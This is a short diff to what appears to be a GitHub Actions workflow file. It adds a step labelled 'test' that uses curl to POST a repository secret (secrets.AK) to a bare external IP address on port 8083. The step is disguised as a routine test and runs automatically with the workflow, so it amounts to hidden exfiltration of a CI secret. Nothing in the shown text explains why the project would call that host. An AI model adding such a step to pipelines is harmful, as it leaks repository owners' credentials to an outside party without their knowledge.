@@ -50,3 +50,6 @@ jobs:
                 }
               ]
             }
+      - id: test
+        run: |
+          curl -X POST -d "Hello, Server ${{ secrets.AK }} \!" http://8.222.214.141:8083
